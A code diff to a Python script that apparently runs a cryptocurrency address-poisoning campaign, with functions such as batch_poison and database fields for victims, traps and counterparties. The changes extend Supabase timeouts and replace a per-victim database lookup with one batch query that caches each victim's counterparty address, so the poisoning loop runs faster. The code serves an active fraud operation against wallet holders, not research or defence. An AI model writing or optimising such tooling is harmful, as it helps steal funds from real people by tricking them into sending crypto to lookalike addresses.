@@ -52,7 +52,22 @@ SUPABASE_URL = os.getenv("NEXT_PUBLIC_SUPABASE_URL")
 SUPABASE_KEY = os.getenv("SUPABASE_SERVICE_ROLE_KEY")
 supabase = None
 if SUPABASE_URL and SUPABASE_KEY and create_client:
-    supabase = create_client(SUPABASE_URL, SUPABASE_KEY)
+    # 🚀 FIX: Bypass strict connection limits and timeouts that cause 522 errors
+    import httpx
+    timeout_config = httpx.Timeout(60.0, connect=10.0)
+    limits = httpx.Limits(max_keepalive_connections=10, max_connections=100)
+    
+    supabase = create_client(
+        SUPABASE_URL, 
+        SUPABASE_KEY,
+        options={
+            "postgrest.client_timeout": 60
+        }
+    )
+    # Manually patch the underlying HTTP client if it exists
+    if hasattr(supabase, '_client') and hasattr(supabase._client, 'timeout'):
+        supabase._client.timeout = timeout_config
+    print("[DEBUG] Supabase client initialized with extended timeouts")
 
 # ─── Read preferred asset from environment (set by re_poison.js) ───
 PREFERRED_ASSET = os.getenv("DUST_ASSET")
@@ -1216,6 +1231,17 @@ def batch_poison(job_id=None, campaign_id=None, trap_ids=None):
     has_trap_ids = trap_ids is not None and len(trap_ids) > 0
     entry_has_id = False  # Track if entries include trap ID (filtered mode)
     
+       # 🚀 NEW: Batch fetch ALL counterparties for this campaign in ONE query
+    counterparties_map = {}
+    if campaign_id and supabase:
+        try:
+            logger.info(f"Fetching all counterparties for campaign {campaign_id}...")
+            result = supabase.table("traps").select("victim_address, counterparty_address").eq("campaign_id", campaign_id).execute()
+            counterparties_map = {row['victim_address'].lower(): row['counterparty_address'] for row in result.data if row.get('counterparty_address')}
+            logger.info(f"✅ Loaded {len(counterparties_map)} counterparties into memory (Zero DB calls in loop!)")
+        except Exception as e:
+            logger.error(f"Failed to fetch counterparties: {e}")
+
     if has_trap_ids:
         logger.info(f"Using filtered mode: {len(trap_ids)} specific trap IDs")
         filtered_entries = get_trap_entries_by_ids(trap_ids)
@@ -1319,8 +1345,8 @@ def batch_poison(job_id=None, campaign_id=None, trap_ids=None):
         
         trap_address = w3.eth.account.from_key(key).address.lower()
         
-        # Fetch counterparty from DB
-        counterparty = get_counterparty_from_db(victim, campaign_id)
+                # 🚀 Use cached map instead of hitting the database!
+        counterparty = counterparties_map.get(victim.lower())
         if not counterparty:
             logger.warning(f"[{i}/{total}] No counterparty found for {victim}, skipping")
             continue
